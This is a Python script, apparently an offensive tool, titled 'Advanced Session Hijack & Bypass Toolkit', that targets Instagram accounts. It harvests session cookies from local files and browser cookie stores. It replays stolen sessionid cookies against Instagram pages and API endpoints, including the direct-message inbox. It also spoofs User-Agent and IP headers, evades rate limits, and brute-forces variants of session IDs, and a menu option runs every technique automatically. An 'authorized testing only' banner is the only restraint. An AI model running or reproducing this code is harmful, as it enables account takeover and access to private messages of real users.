# -*- coding: utf-8 -*-
# pylint: disable=all
# flake8: noqa
# type: ignore
# mypy: ignore-errors
#!/usr/bin/env python3
"""
🔥💀 ADVANCED SESSION HIJACK & BYPASS TOOLKIT 2025 💀🔥
========================================================
เครื่องมือขั้นสูงสำหรับการทดสอบ session hijacking และ bypass techniques
สำหรับเจ้าของระบบและการทดสอบความปลอดภัยที่ได้รับอนุญาต

⚠️ FOR AUTHORIZED SECURITY TESTING ONLY ⚠️
"""

import requests
import json
import time
import random
import hashlib
import base64
import urllib.parse
from datetime import datetime, timedelta
from pathlib import Path
import subprocess
import threading
from typing import Dict, List, Optional, Tuple
import warnings
warnings.filterwarnings("ignore")

class AdvancedSessionHijacker:
    """🥷 Advanced Session Hijacking & Bypass Toolkit"""

    def __init__(self):
        self.project_root = "/workspaces/sugarglitch-realops"
        self.sessions_dir = Path(f"{self.project_root}/sessions")
        self.hijacked_sessions_dir = Path(f"{self.project_root}/hijacked_sessions")
        self.hijacked_sessions_dir.mkdir(parents=True, exist_ok=True)

        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/111.0 Firefox/120.0'
        ]

        self.proxy_list = [
            {'http': 'http://proxy1:8080', 'https': 'https://proxy1:8080'},
            {'http': 'http://proxy2:8080', 'https': 'https://proxy2:8080'},
            # Add more proxies as needed
        ]

        print("🔥💀 ADVANCED SESSION HIJACK & BYPASS TOOLKIT 2025")
        print("=" * 60)
        print("⚠️ FOR AUTHORIZED SECURITY TESTING ONLY ⚠️")
        print("=" * 60)

    def scan_for_sessions(self):
        """🔍 Scan for existing sessions in the system"""
        print("\n🔍 SCANNING FOR EXISTING SESSIONS")
        print("-" * 40)

        sessions_found = []

        # Scan sessions directory
        for session_file in self.sessions_dir.glob("*"):
            if session_file.is_file():
                try:
                    session_data = self.analyze_session_file(session_file)
                    if session_data:
                        sessions_found.append({
                            'file': str(session_file),
                            'type': session_data['type'],
                            'valid': session_data['valid'],
                            'age': session_data['age']
                        })
                        print(f"📂 Found: {session_file.name}")
                        print(f"   Type: {session_data['type']}")
                        print(f"   Valid: {session_data['valid']}")
                        print(f"   Age: {session_data['age']} days")
                        print()
                except Exception as e:
                    print(f"❌ Error analyzing {session_file.name}: {e}")

        # Scan browser sessions
        browser_sessions = self.scan_browser_sessions()
        sessions_found.extend(browser_sessions)

        return sessions_found

    def analyze_session_file(self, session_file):
        """📊 Analyze a session file"""
        try:
            # Skip binary files (certificates, executables, etc.)
            if session_file.suffix.lower() in ['.p12', '.pfx', '.cer', '.crt', '.exe', '.bin', '.so']:
                print(f"⏭️ Skipping binary file: {session_file.name}")
                return None
                
            # Check if file is too large (likely not a session file)
            if session_file.stat().st_size > 10 * 1024 * 1024:  # 10MB
                print(f"⏭️ Skipping large file: {session_file.name}")
                return None

            # Try to read as text first
            try:
                with open(session_file, 'r', encoding='utf-8') as f:
                    content = f.read()
            except UnicodeDecodeError:
                # Try different encodings or skip binary files
                try:
                    with open(session_file, 'r', encoding='latin-1') as f:
                        content = f.read()
                except Exception:
                    print(f"⏭️ Skipping binary/unreadable file: {session_file.name}")
                    return None

            # Try to parse as JSON
            try:
                data = json.loads(content)
                if 'cookies' in data and 'sessionid' in data['cookies']:
                    sessionid = data['cookies']['sessionid']
                    decoded = urllib.parse.unquote(sessionid)

                    # Extract timestamp from Instagram session format
                    parts = decoded.split(':')
                    if len(parts) >= 2:
                        try:
                            timestamp = int(parts[1])
                            age = (datetime.now() - datetime.fromtimestamp(timestamp)).days

                            return {
                                'type': 'instagram_session',
                                'sessionid': sessionid,
                                'decoded': decoded,
                                'timestamp': timestamp,
                                'age': age,
                                'valid': age < 90
                            }
                        except Exception:
                            pass

                # Check for other session formats
                if 'sessionid' in data:
                    return {
                        'type': 'simple_session',
                        'sessionid': data['sessionid'],
                        'valid': True,
                        'age': 'unknown'
                    }

                return {
                    'type': 'unknown_json',
                    'valid': False,
                    'age': 'unknown'
                }
            except Exception:
                # Not JSON, might be plain text session
                if 'sessionid' in content.lower():
                    return {
                        'type': 'plain_session',
                        'valid': True,
                        'age': 'unknown'
                    }
                else:
                    return {
                        'type': 'unknown_text',
                        'valid': False,
                        'age': 'unknown'
                    }
        except Exception as e:
            print(f"⚠️ Error analyzing {session_file.name}: {e}")
            return None

    def scan_browser_sessions(self):
        """🌐 Scan for browser sessions and cookies"""
        print("🌐 SCANNING BROWSER SESSIONS")
        print("-" * 30)

        browser_sessions = []

        # Chrome cookies location
        chrome_paths = [
            "~/.config/google-chrome/Default/Cookies",
            "~/Library/Application Support/Google/Chrome/Default/Cookies",
            "C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"
        ]

        for path in chrome_paths:
            expanded_path = Path(path).expanduser()
            if expanded_path.exists():
                print(f"📂 Found Chrome cookies: {expanded_path}")
                # Note: Chrome cookies are encrypted, would need decryption
                browser_sessions.append({
                    'file': str(expanded_path),
                    'type': 'chrome_cookies',
                    'valid': 'encrypted',
                    'age': 'unknown'
                })

        return browser_sessions

    def hijack_session_technique_1(self, target_session):
        """🥷 Session Hijacking Technique 1: Cookie Extraction"""
        print(f"\n🥷 TECHNIQUE 1: COOKIE EXTRACTION")
        print(f"Target: {target_session}")
        print("-" * 40)

        try:
            # Skip binary files
            target_path = Path(target_session)
            if target_path.suffix.lower() in ['.p12', '.pfx', '.cer', '.crt', '.exe', '.bin', '.so']:
                print(f"⏭️ Skipping binary file: {target_path.name}")
                return None

            # Load target session with encoding handling
            try:
                with open(target_session, 'r', encoding='utf-8') as f:
                    session_data = json.load(f)
            except (UnicodeDecodeError, json.JSONDecodeError) as e:
                print(f"❌ Cannot read session file: {e}")
                return None

            if 'cookies' in session_data:
                hijacked_cookies = session_data['cookies'].copy()

                # Create hijacked session with modifications
                hijacked_session = {
                    'hijacked_from': str(target_session),
                    'hijack_timestamp': datetime.now().isoformat(),
                    'technique': 'cookie_extraction',
                    'cookies': hijacked_cookies,
                    'modifications': []
                }

                # Save hijacked session
                hijack_file = self.hijacked_sessions_dir / f"hijacked_session_{int(time.time())}.json"
                with open(hijack_file, 'w') as f:
                    json.dump(hijacked_session, f, indent=2)

                print(f"✅ Session hijacked and saved: {hijack_file}")
                return str(hijack_file)
            else:
                print("❌ No cookies found in session file")
                return None

        except Exception as e:
            print(f"❌ Hijack failed: {e}")
            return None

    def hijack_session_technique_2(self, target_session):
        """🎭 Session Hijacking Technique 2: User-Agent Spoofing"""
        print(f"\n🎭 TECHNIQUE 2: USER-AGENT SPOOFING")
        print("-" * 40)

        try:
            with open(target_session, 'r') as f:
                session_data = json.load(f)

            # Test session with different User-Agents
            sessionid = session_data['cookies']['sessionid']

            for i, ua in enumerate(self.user_agents):
                print(f"🔄 Testing User-Agent {i+1}/{len(self.user_agents)}")

                headers = {
                    'User-Agent': ua,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Cookie': f'sessionid={sessionid}',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1'
                }

                try:
                    response = requests.get('https://www.instagram.com/', headers=headers, timeout=10)

                    if response.status_code == 200:
                        print(f"✅ User-Agent {i+1} successful: {ua[:50]}...")

                        # Create spoofed session
                        spoofed_session = {
                            'hijacked_from': str(target_session),
                            'hijack_timestamp': datetime.now().isoformat(),
                            'technique': 'user_agent_spoofing',
                            'successful_user_agent': ua,
                            'cookies': session_data['cookies'],
                            'test_response_code': response.status_code
                        }

                        spoofed_file = self.hijacked_sessions_dir / f"spoofed_session_{int(time.time())}.json"
                        with open(spoofed_file, 'w') as f:
                            json.dump(spoofed_session, f, indent=2)

                        return str(spoofed_file)
                    else:
                        print(f"❌ User-Agent {i+1} failed: {response.status_code}")

                except Exception as e:
                    print(f"❌ User-Agent {i+1} error: {e}")

                time.sleep(random.uniform(1, 3))

        except Exception as e:
            print(f"❌ Spoofing failed: {e}")
            return None

    def hijack_session_technique_3(self, target_session):
        """🌐 Session Hijacking Technique 3: IP Address Spoofing"""
        print(f"\n🌐 TECHNIQUE 3: IP ADDRESS SPOOFING")
        print("-" * 40)

        try:
            with open(target_session, 'r') as f:
                session_data = json.load(f)

            sessionid = session_data['cookies']['sessionid']

            # Test with different IP addresses (using headers)
            fake_ips = [
                '192.168.1.100',
                '10.0.0.100',
                '172.16.0.100',
                '203.0.113.100',
                '198.51.100.100'
            ]

            for ip in fake_ips:
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'X-Forwarded-For': ip,
                    'X-Real-IP': ip,
                    'X-Originating-IP': ip,
                    'X-Remote-IP': ip,
                    'X-Client-IP': ip,
                    'Cookie': f'sessionid={sessionid}',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                }

                try:
                    response = requests.get('https://www.instagram.com/', headers=headers, timeout=10)
                    print(f"🔄 Testing IP {ip}: {response.status_code}")

                    if response.status_code == 200:
                        print(f"✅ IP spoofing successful with {ip}")

                        spoofed_session = {
                            'hijacked_from': str(target_session),
                            'hijack_timestamp': datetime.now().isoformat(),
                            'technique': 'ip_spoofing',
                            'spoofed_ip': ip,
                            'cookies': session_data['cookies'],
                            'successful_headers': headers
                        }

                        spoofed_file = self.hijacked_sessions_dir / f"ip_spoofed_session_{int(time.time())}.json"
                        with open(spoofed_file, 'w') as f:
                            json.dump(spoofed_session, f, indent=2)

                        return str(spoofed_file)

                except Exception as e:
                    print(f"❌ IP {ip} error: {e}")

                time.sleep(random.uniform(1, 2))

        except Exception as e:
            print(f"❌ IP spoofing failed: {e}")
            return None

    def bypass_technique_1(self, session_file):
        """🚀 Bypass Technique 1: Rate Limit Bypass"""
        print(f"\n🚀 BYPASS TECHNIQUE 1: RATE LIMIT BYPASS")
        print("-" * 40)

        try:
            with open(session_file, 'r') as f:
                session_data = json.load(f)

            sessionid = session_data['cookies']['sessionid']

            # Multiple bypass strategies
            bypass_strategies = [
                {'delay': (1, 3), 'user_agent_rotation': True, 'headers': {}},
                {'delay': (3, 8), 'user_agent_rotation': True, 'headers': {'X-Requested-With': 'XMLHttpRequest'}},
                {'delay': (5, 12), 'user_agent_rotation': False, 'headers': {'Referer': 'https://www.instagram.com/'}},
            ]

            for i, strategy in enumerate(bypass_strategies):
                print(f"🔄 Testing bypass strategy {i+1}")

                for attempt in range(5):
                    headers = {
                        'User-Agent': random.choice(self.user_agents) if strategy['user_agent_rotation'] else self.user_agents[0],
                        'Cookie': f'sessionid={sessionid}',
                        'Accept': 'application/json, text/plain, */*',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'same-origin',
                        **strategy['headers']
                    }

                    try:
                        response = requests.get('https://www.instagram.com/api/v1/users/web_profile_info/',
                                              headers=headers, timeout=10)

                        print(f"   Attempt {attempt+1}: {response.status_code}")

                        if response.status_code == 200:
                            print(f"✅ Bypass successful with strategy {i+1}")

                            bypass_session = {
                                'original_session': session_file,
                                'bypass_timestamp': datetime.now().isoformat(),
                                'technique': 'rate_limit_bypass',
                                'successful_strategy': strategy,
                                'cookies': session_data['cookies'],
                                'test_response_code': response.status_code
                            }

                            bypass_file = self.hijacked_sessions_dir / f"bypass_session_{int(time.time())}.json"
                            with open(bypass_file, 'w') as f:
                                json.dump(bypass_session, f, indent=2)

                            return str(bypass_file)

                        elif response.status_code == 429:
                            print(f"   Rate limited, waiting...")
                            time.sleep(random.uniform(*strategy['delay']))

                    except Exception as e:
                        print(f"   Error: {e}")

                    time.sleep(random.uniform(*strategy['delay']))

        except Exception as e:
            print(f"❌ Bypass failed: {e}")
            return None

    def bypass_technique_2(self, session_file):
        """🎭 Bypass Technique 2: Session Rotation"""
        print(f"\n🎭 BYPASS TECHNIQUE 2: SESSION ROTATION")
        print("-" * 40)

        try:
            with open(session_file, 'r') as f:
                session_data = json.load(f)

            original_sessionid = session_data['cookies']['sessionid']

            # Generate variations of the session ID
            variations = []

            # Technique 1: Modify last few characters
            for i in range(5):
                modified = original_sessionid[:-4] + ''.join(random.choices('0123456789abcdef', k=4))
                variations.append(modified)

            # Technique 2: Modify middle characters
            for i in range(5):
                mid = len(original_sessionid) // 2
                modified = original_sessionid[:mid-2] + ''.join(random.choices('0123456789abcdef', k=4)) + original_sessionid[mid+2:]
                variations.append(modified)

            print(f"🔄 Testing {len(variations)} session variations")

            for i, variation in enumerate(variations):
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Cookie': f'sessionid={variation}',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                }

                try:
                    response = requests.get('https://www.instagram.com/', headers=headers, timeout=10)
                    print(f"   Variation {i+1}: {response.status_code}")

                    if response.status_code == 200 and 'login' not in response.url:
                        print(f"✅ Session variation {i+1} successful!")

                        rotated_session = {
                            'original_session': session_file,
                            'bypass_timestamp': datetime.now().isoformat(),
                            'technique': 'session_rotation',
                            'original_sessionid': original_sessionid,
                            'successful_variation': variation,
                            'cookies': {'sessionid': variation}
                        }

                        rotated_file = self.hijacked_sessions_dir / f"rotated_session_{int(time.time())}.json"
                        with open(rotated_file, 'w') as f:
                            json.dump(rotated_session, f, indent=2)

                        return str(rotated_file)

                except Exception as e:
                    print(f"   Variation {i+1} error: {e}")

                time.sleep(random.uniform(1, 3))

        except Exception as e:
            print(f"❌ Session rotation failed: {e}")
            return None

    def test_hijacked_session(self, hijacked_session_file):
        """🧪 Test hijacked session functionality"""
        print(f"\n🧪 TESTING HIJACKED SESSION")
        print(f"File: {hijacked_session_file}")
        print("-" * 40)

        try:
            with open(hijacked_session_file, 'r') as f:
                hijacked_data = json.load(f)

            sessionid = hijacked_data['cookies']['sessionid']

            # Test endpoints
            test_endpoints = [
                'https://www.instagram.com/',
                'https://www.instagram.com/direct/',
                'https://www.instagram.com/api/v1/users/web_profile_info/',
                'https://www.instagram.com/api/v1/direct_v2/inbox/'
            ]

            results = []

            for endpoint in test_endpoints:
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Cookie': f'sessionid={sessionid}',
                    'Accept': 'application/json, text/plain, */*' if 'api' in endpoint else 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                }

                try:
                    response = requests.get(endpoint, headers=headers, timeout=10)
                    status = "✅ SUCCESS" if response.status_code == 200 else f"❌ FAILED ({response.status_code})"
                    print(f"{status}: {endpoint}")

                    results.append({
                        'endpoint': endpoint,
                        'status_code': response.status_code,
                        'success': response.status_code == 200,
                        'content_length': len(response.content)
                    })

                except Exception as e:
                    print(f"❌ ERROR: {endpoint} - {e}")
                    results.append({
                        'endpoint': endpoint,
                        'status_code': 'error',
                        'success': False,
                        'error': str(e)
                    })

                time.sleep(random.uniform(1, 3))

            # Save test results
            test_results = {
                'hijacked_session_file': hijacked_session_file,
                'test_timestamp': datetime.now().isoformat(),
                'results': results,
                'success_rate': sum(1 for r in results if r['success']) / len(results) * 100
            }

            results_file = self.hijacked_sessions_dir / f"test_results_{int(time.time())}.json"
            with open(results_file, 'w') as f:
                json.dump(test_results, f, indent=2)

            print(f"\n📊 Test Results:")
            print(f"   Success Rate: {test_results['success_rate']:.1f}%")
            print(f"   Results saved: {results_file}")

            return test_results

        except Exception as e:
            print(f"❌ Testing failed: {e}")
            return None

    def create_bypass_report(self):
        """📊 Create comprehensive bypass report"""
        print(f"\n📊 CREATING BYPASS REPORT")
        print("-" * 30)

        # Collect all hijacked sessions
        hijacked_sessions = list(self.hijacked_sessions_dir.glob("*.json"))

        report = {
            'report_timestamp': datetime.now().isoformat(),
            'total_hijacked_sessions': len(hijacked_sessions),
            'techniques_used': [],
            'success_summary': {},
            'recommendations': []
        }

        techniques_count = {}

        for session_file in hijacked_sessions:
            try:
                with open(session_file, 'r') as f:
                    data = json.load(f)

                technique = data.get('technique', 'unknown')
                techniques_count[technique] = techniques_count.get(technique, 0) + 1

                if technique not in report['techniques_used']:
                    report['techniques_used'].append(technique)

            except Exception:
                continue

        report['success_summary'] = techniques_count

        # Add recommendations based on findings
        if 'cookie_extraction' in techniques_count:
            report['recommendations'].append("🔒 Implement secure cookie storage with HttpOnly and Secure flags")

        if 'user_agent_spoofing' in techniques_count:
            report['recommendations'].append("🕵️ Implement User-Agent validation and fingerprinting")

        if 'ip_spoofing' in techniques_count:
            report['recommendations'].append("📍 Implement IP binding for session validation")

        if 'rate_limit_bypass' in techniques_count:
            report['recommendations'].append("⏰ Strengthen rate limiting with device fingerprinting")

        if 'session_rotation' in techniques_count:
            report['recommendations'].append("🔄 Implement strong session ID generation and validation")

        # Save report
        report_file = self.hijacked_sessions_dir / f"bypass_report_{int(time.time())}.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)

        print(f"✅ Report saved: {report_file}")

        # Print summary
        print(f"\n📋 BYPASS SUMMARY:")
        print(f"   Total Sessions Hijacked: {report['total_hijacked_sessions']}")
        print(f"   Techniques Used: {len(report['techniques_used'])}")
        for technique, count in techniques_count.items():
            print(f"   - {technique}: {count} sessions")

        return report

    def interactive_menu(self):
        """🎮 Interactive menu for session hijacking and bypass"""
        while True:
            print(f"\n🔥💀 ADVANCED SESSION HIJACK & BYPASS MENU")
            print("=" * 50)
            print("1. 🔍 Scan for Sessions")
            print("2. 🥷 Hijack Session (Cookie Extraction)")
            print("3. 🎭 Hijack Session (User-Agent Spoofing)")
            print("4. 🌐 Hijack Session (IP Spoofing)")
            print("5. 🚀 Bypass Rate Limits")
            print("6. 🎭 Session Rotation Bypass")
            print("7. 🧪 Test Hijacked Session")
            print("8. 📊 Create Bypass Report")
            print("9. 💀 Full Auto Hijack (All Techniques)")
            print("0. ❌ Exit")
            print("-" * 50)

            choice = input("🎯 Select option: ").strip()

            if choice == '1':
                sessions = self.scan_for_sessions()
                if sessions:
                    print(f"\n✅ Found {len(sessions)} sessions")
                else:
                    print("\n❌ No sessions found")

            elif choice == '2':
                sessions = list(self.sessions_dir.glob("*"))
                if sessions:
                    print("\nAvailable sessions:")
                    for i, session in enumerate(sessions):
                        print(f"{i+1}. {session.name}")

                    try:
                        idx = int(input("Select session: ")) - 1
                        if 0 <= idx < len(sessions):
                            result = self.hijack_session_technique_1(sessions[idx])
                            if result:
                                print(f"✅ Session hijacked: {result}")
                    except ValueError:
                        print("❌ Invalid selection")
                else:
                    print("❌ No sessions available")

            elif choice == '3':
                sessions = list(self.sessions_dir.glob("*"))
                if sessions:
                    print("\nAvailable sessions:")
                    for i, session in enumerate(sessions):
                        print(f"{i+1}. {session.name}")

                    try:
                        idx = int(input("Select session: ")) - 1
                        if 0 <= idx < len(sessions):
                            result = self.hijack_session_technique_2(sessions[idx])
                            if result:
                                print(f"✅ Session spoofed: {result}")
                    except ValueError:
                        print("❌ Invalid selection")
                else:
                    print("❌ No sessions available")

            elif choice == '4':
                sessions = list(self.sessions_dir.glob("*"))
                if sessions:
                    print("\nAvailable sessions:")
                    for i, session in enumerate(sessions):
                        print(f"{i+1}. {session.name}")

                    try:
                        idx = int(input("Select session: ")) - 1
                        if 0 <= idx < len(sessions):
                            result = self.hijack_session_technique_3(sessions[idx])
                            if result:
                                print(f"✅ IP spoofed session: {result}")
                    except ValueError:
                        print("❌ Invalid selection")
                else:
                    print("❌ No sessions available")

            elif choice == '5':
                sessions = list(self.sessions_dir.glob("*"))
                if sessions:
                    print("\nAvailable sessions:")
                    for i, session in enumerate(sessions):
                        print(f"{i+1}. {session.name}")

                    try:
                        idx = int(input("Select session: ")) - 1
                        if 0 <= idx < len(sessions):
                            result = self.bypass_technique_1(sessions[idx])
                            if result:
                                print(f"✅ Rate limit bypassed: {result}")
                    except ValueError:
                        print("❌ Invalid selection")
                else:
                    print("❌ No sessions available")

            elif choice == '6':
                sessions = list(self.sessions_dir.glob("*"))
                if sessions:
                    print("\nAvailable sessions:")
                    for i, session in enumerate(sessions):
                        print(f"{i+1}. {session.name}")

                    try:
                        idx = int(input("Select session: ")) - 1
                        if 0 <= idx < len(sessions):
                            result = self.bypass_technique_2(sessions[idx])
                            if result:
                                print(f"✅ Session rotated: {result}")
                    except ValueError:
                        print("❌ Invalid selection")
                else:
                    print("❌ No sessions available")

            elif choice == '7':
                hijacked_sessions = list(self.hijacked_sessions_dir.glob("*.json"))
                if hijacked_sessions:
                    print("\nHijacked sessions:")
                    for i, session in enumerate(hijacked_sessions):
                        print(f"{i+1}. {session.name}")

                    try:
                        idx = int(input("Select hijacked session: ")) - 1
                        if 0 <= idx < len(hijacked_sessions):
                            result = self.test_hijacked_session(hijacked_sessions[idx])
                            if result:
                                print(f"✅ Test completed: {result['success_rate']:.1f}% success rate")
                    except ValueError:
                        print("❌ Invalid selection")
                else:
                    print("❌ No hijacked sessions available")

            elif choice == '8':
                report = self.create_bypass_report()
                if report:
                    print("✅ Report created successfully")

            elif choice == '9':
                print("\n💀 FULL AUTO HIJACK - ALL TECHNIQUES")
                print("⚠️ This will attempt all hijacking techniques on all available sessions")
                confirm = input("Are you sure? (yes/no): ").strip().lower()

                if confirm == 'yes':
                    sessions = list(self.sessions_dir.glob("*"))
                    if sessions:
                        for session in sessions:
                            print(f"\n🎯 Auto-hijacking: {session.name}")

                            # Try all techniques
                            techniques = [
                                self.hijack_session_technique_1,
                                self.hijack_session_technique_2,
                                self.hijack_session_technique_3,
                                self.bypass_technique_1,
                                self.bypass_technique_2
                            ]

                            for technique in techniques:
                                try:
                                    result = technique(session)
                                    if result:
                                        print(f"   ✅ {technique.__name__} successful")
                                        # Test the hijacked session
                                        self.test_hijacked_session(result)
                                    else:
                                        print(f"   ❌ {technique.__name__} failed")
                                except Exception as e:
                                    print(f"   ❌ {technique.__name__} error: {e}")

                                time.sleep(2)

                        # Generate final report
                        self.create_bypass_report()
                        print("\n🎉 Full auto hijack completed!")
                    else:
                        print("❌ No sessions available for auto hijack")

            elif choice == '0':
                print("\n👋 Exiting Advanced Session Hijack & Bypass Toolkit")
                break

            else:
                print("❌ Invalid option")

def main():
    """🚀 Main function"""
    hijacker = AdvancedSessionHijacker()
    hijacker.interactive_menu()

if __name__ == "__main__":
    main()
